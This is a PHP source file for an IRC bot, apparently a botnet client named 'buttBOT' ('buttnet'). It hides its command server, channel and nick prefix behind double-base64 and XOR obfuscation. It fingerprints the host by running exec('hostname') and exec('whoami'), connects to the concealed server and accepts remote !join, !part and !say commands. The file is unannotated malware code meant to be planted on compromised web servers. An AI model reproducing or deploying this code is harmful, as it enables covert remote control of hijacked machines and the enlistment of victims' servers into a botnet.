<?php

set_time_limit(0);
ini_set('display_errors', 'on');

$config = array( 
        'server' => snowden('SVI4dkdFTkZKeFVxUml3a2VGNDdLdz09'), 
        'port'   => 6667, 
        'channel' => snowden('YXc4NVFsND0='),
        'name'   => snowden('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
        'nick'   => snowden('S2hnNFFtaFlNRGs9').exec('hostname').'-'.exec('whoami').'-'.strval(rand(1,1000)), 
        'pass'   => snowden(''), 
);

                                 
function snowden($string) {

 $white = base64_decode(base64_decode('U0cxTU5pbzNSR1pGTTBCZVZqRkpURWx1WHk0K1YwQnJNMVZ3S1FvPQo='));
 $text = base64_decode(base64_decode($string));
 $black = '';

 for($i=0,$j=0;($i<strlen($text) && $j<strlen($white));$i++,$j++)
 {
         $black .= $text{$i} ^ $white{$j};
 }

 return $black;
}
class buttBOT {

        var $socket;
        var $buf = array();
	var $pongCount = 0;
	var $joined = false;
        // @param array
        function __construct($config)

        {
		$this->socket = fsockopen($config['server'], $config['port']);
                $this->login($config);
                $this->main($config);
        }



         //@param array

        function login($config)
        {
                $this->send_data('USER', $config['nick'].' null '.$config['nick'].' :'.$config['name']);
                $this->send_data('NICK', $config['nick']);
//		$this->join_channel($config['channel']);
        }




        function main($config)
        {             
                $data = fgets($this->socket, 256);
                //debug
                echo nl2br($data);		
                flush();

                $this->buf = explode(' ', $data);


                if($this->buf[0] == 'PING')
                {
                        $this->send_data('PONG', $this->buf[1]);
			$this->pongCount++;
                }
		if(($this->pongCount >= 1) && ($this->joined == false))
		{
			$this->join_channel($config['channel']);
			$this->joined = true;
		}

                $command = str_replace(array(chr(10), chr(13)), '', $this->buf[3]);

                switch($command) 
                {                      
                        case ':!join':
                                $this->join_channel($this->buf[4]);
                                break;                     
                        case ':!part':
                                $this->send_data('PART '.$this->buf[4].' :', 'welcome to buttnet');
                                break;   
                                                                 
                        case ':!say':
                                $message = "";
                                for($i=5; $i <= (count($this->buf)); $i++)
                                {
                                        $message .= $this->buf[$i]." ";
                                }
                                
                                $this->send_data('PRIVMSG '.$this->buf[4].' :', $message);
                                break;                        		
                        
                }

                $this->main($config);
        }



        function send_data($cmd, $msg = null) 
        {
                if($msg == null)
                {
                        fputs($this->socket, $cmd."\r\n");
                } else {

                        fputs($this->socket, $cmd.' '.$msg."\r\n");
                }

        }



        function join_channel($channel) 
        {

                if(is_array($channel))
                {
                        foreach($channel as $chan)
                        {
                                $this->send_data('JOIN', $chan);
                        }

                } else {
                        $this->send_data('JOIN', $channel);
                }
        }     
}

$bot = new buttBOT($config);
?>
